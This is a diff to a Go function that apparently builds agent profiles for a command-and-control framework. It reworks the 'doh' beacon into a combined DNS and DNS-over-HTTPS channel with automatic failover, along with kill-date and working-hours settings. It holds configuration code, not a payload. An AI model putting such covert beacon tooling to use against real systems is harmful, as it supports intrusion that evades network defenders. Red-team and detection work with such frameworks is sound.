@@ -238,9 +238,19 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		params = append(params, generateConfig.Jitter)
 
 	case "doh":
+		// Upgrade "doh" protocol to be the full DNS+DoH combined beacon.
+		// ProfileDNSDoH structure on the C++ side:
+		//   struct ProfileDNSDoH { ProfileDNS dns; ProfileDoH doh; BYTE* mode; };
+		// Here we pack it as: [DNS fields...][DoH fields...][mode string][common timing fields...]
+
 		domain, _ := listenerMap["domain"].(string)
-		urls, _ := listenerMap["doh_urls"].(string)
+		// --- DNS params ---
+		resolvers, _ := listenerMap["resolvers"].(string)
+		qtype, _ := listenerMap["qtype"].(string)
+		// --- DoH params ---
+		doh_urls, _ := listenerMap["doh_urls"].(string)
 		user_agent, _ := listenerMap["user_agent"].(string)
+		// shared
 		pkt_size_f, _ := listenerMap["pkt_size"].(float64)
 		ttl_f, _ := listenerMap["ttl"].(float64)
 		label_size_f, _ := listenerMap["label_size"].(float64)
@@ -259,13 +269,33 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 
 		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
 
+		// Default mode is "auto" => start on DNS, auto-failover to DoH.
+		mode := "auto"
+
 		params = append(params, int(agentWatermark))
+
+		// --- DNS part (ProfileDNS) ---
 		params = append(params, domain)
-		params = append(params, urls)
+		params = append(params, resolvers)
+		params = append(params, qtype)
+		params = append(params, pkt_size)
+		params = append(params, label_size)
+		params = append(params, ttl)
+		params = append(params, int(agentWatermark)) // encrypt_key placeholder
+
+		// --- DoH part (ProfileDoH) ---
+		params = append(params, domain)
+		params = append(params, doh_urls)
 		params = append(params, user_agent)
 		params = append(params, pkt_size)
 		params = append(params, label_size)
 		params = append(params, ttl)
+		params = append(params, int(agentWatermark)) // encrypt_key placeholder
+
+		// --- Mode string ---
+		params = append(params, mode)
+
+		// --- Common tail (listener watermark + timing) ---
 		params = append(params, int(lWatermark))
 		params = append(params, kill_date)
 		params = append(params, working_time)
